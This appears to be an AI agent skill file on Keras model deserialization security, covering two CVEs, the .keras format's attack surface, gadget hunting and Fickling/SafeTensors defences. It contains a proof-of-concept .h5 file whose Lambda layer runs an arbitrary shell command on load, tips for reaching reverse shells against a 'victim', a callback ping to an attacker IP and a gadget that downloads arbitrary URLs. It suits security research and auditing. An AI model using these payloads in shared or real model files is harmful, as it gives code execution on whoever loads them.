---
name: keras-model-security
description: Analyze Keras model files (.keras, .h5) for deserialization vulnerabilities, create test payloads for security research, and assess ML model security posture. Use this skill whenever the user mentions Keras models, model deserialization, ML model security, .keras files, .h5 files, TensorFlow-Keras, pickle vulnerabilities in ML, or wants to test/audit model file security. This includes CVE-2024-3660, CVE-2025-1550, gadget hunting, and Fickling-based protections.
---

# Keras Model Security Analysis

A skill for analyzing Keras model deserialization vulnerabilities, creating security test payloads, and assessing ML model file security.

## When to use this skill

Use this skill when:
- Analyzing .keras or .h5 model files for security vulnerabilities
- Researching Keras deserialization attack surface
- Creating test payloads for security assessments
- Auditing ML model loading pipelines
- Investigating CVE-2024-3660 (Lambda bytecode RCE) or CVE-2025-1550 (arbitrary import)
- Hunting gadgets in allowlisted Keras modules
- Implementing Fickling-based pickle protections
- Understanding .keras format internals and attack vectors

## Core Concepts

### .keras Format Attack Surface

A .keras file is a ZIP archive containing:
- `metadata.json` – Keras version info
- `config.json` – **Primary attack surface** (model architecture)
- `model.weights.h5` – HDF5 weights

The `config.json` drives recursive deserialization where Keras:
1. Imports modules from `module` keys
2. Resolves classes/functions from `class_name` keys
3. Invokes constructors or `from_config()` with attacker-controlled kwargs
4. Recurses into nested objects (activations, initializers, constraints)

### Historical Attack Primitives

Attacker control over:
- What modules are imported
- Which classes/functions are resolved
- Kwargs passed to constructors/from_config

## Vulnerability Analysis

### CVE-2024-3660: Lambda-layer Bytecode RCE

**Root cause:** `Lambda.from_config()` used `func_load()` which base64-decoded and called `marshal.loads()` on attacker bytes.

**Payload structure:**
```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit",
    "function": {
      "function_type": "lambda",
      "bytecode_b64": "<attacker_payload>"
    }
  }
}
```

**Mitigation:** Keras enforces `safe_mode=True` by default. Legacy formats or older codebases may not enforce this.

### CVE-2025-1550: Arbitrary Module Import (Keras ≤ 3.8)

**Root cause:** `_retrieve_class_or_fn` used unrestricted `importlib.import_module()` with attacker-controlled module strings.

**Impact:** Arbitrary import of any installed module. Import-time code executes, then object construction occurs with attacker kwargs.

**Security improvements (Keras ≥ 3.9):**
- Module allowlist: `keras`, `keras_hub`, `keras_cv`, `keras_nlp`
- Safe mode default
- Basic type checking

## Practical Exploitation

### Legacy HDF5 (.h5) Lambda RCE

Many production stacks still accept legacy TensorFlow-Keras HDF5 files. A Lambda layer can execute arbitrary Python on load/build/predict.

**Minimal PoC:**
```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("<command>")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")
```

**Reliability tips:**
- Trigger points: code may run multiple times (layer build, model.load_model, predict/fit). Make payloads idempotent.
- Version pinning: match victim's TF/Keras/Python versions
- Validation: use benign payloads like `os.system("ping -c 1 YOUR_IP")` before reverse shells

### Post-Fix Gadget Surface

Even with allowlisting, gadgets remain in allowed Keras callables. Example: `keras.utils.get_file` downloads arbitrary URLs.

**Gadget via Lambda:**
```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {"module": "keras.utils", "class_name": "get_file"},
    "arguments": {
      "fname": "artifact.bin",
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

**Important limitation:** `Lambda.call()` prepends the input tensor as first positional argument. Gadgets must tolerate extra positional args or accept `*args/**kwargs`.

## Fickling: Pickle Import Allowlisting

Many AI/ML formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow) embed pickle data. Fickling implements fail-closed defense by hooking Python's pickle deserializer.

**Security model for safe imports:** Symbols must:
- Not execute code or cause execution
- Not get/set arbitrary attributes or items
- Not import or obtain references to other Python objects
- Not trigger secondary deserializers (marshal, nested pickle)

**Enable protections:**
```python
import fickling
fickling.hook.activate_safe_ml_environment()
```

**Operational tips:**
- Temporarily disable where needed for fully trusted files
- Extend allowlist after reviewing blocked symbols
- Use `fickling.load(path)` / `fickling.is_likely_safe(path)` for one-off checks
- Prefer non-pickle formats (SafeTensors) when possible

## Researcher Toolkit

### 1. Gadget Discovery Script

Use `scripts/enumerate_keras_gadgets.py` to systematically enumerate potentially dangerous callables in allowlisted Keras modules.

### 2. Direct Deserialization Testing

Test crafted dicts directly into Keras deserializers without creating .keras archives:

```python
from keras import layers

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {"module": "keras.utils", "class_name": "get_file"},
    "arguments": {"fname": "x", "origin": "https://example.com/x"}
  }
}

layer = layers.deserialize(cfg, safe_mode=True)
```

### 3. Cross-Version Probing

Test across Keras codebases:
- TensorFlow built-in Keras (legacy)
- tf-keras (maintained separately)
- Multi-backend Keras 3 (official, native .keras)

## Security Recommendations

1. **Enable safe_mode** when loading models: `load_model(path, safe_mode=True)`
2. **Use Fickling** for pickle-based model formats
3. **Pin versions** to Keras ≥ 3.9 with security fixes
4. **Prefer SafeTensors** over pickle-based formats
5. **Run loaders under least privilege** without network egress
6. **Validate model files** before loading in production
7. **Monitor for unexpected imports** during model loading

## Scripts

- `scripts/enumerate_keras_gadgets.py` – Enumerate dangerous callables in Keras modules
- `scripts/test_deserialization.py` – Test crafted config dicts against Keras deserializers
- `scripts/analyze_keras_file.py` – Inspect .keras file structure and config.json

## References

- [Hunting Vulnerabilities in Keras Model Deserialization](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [CVE-2024-3660](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [Fickling – Securing AI/ML environments](https://github.com/trailofbits/fickling)
- [SafeTensors project](https://github.com/safetensors/safetensors)
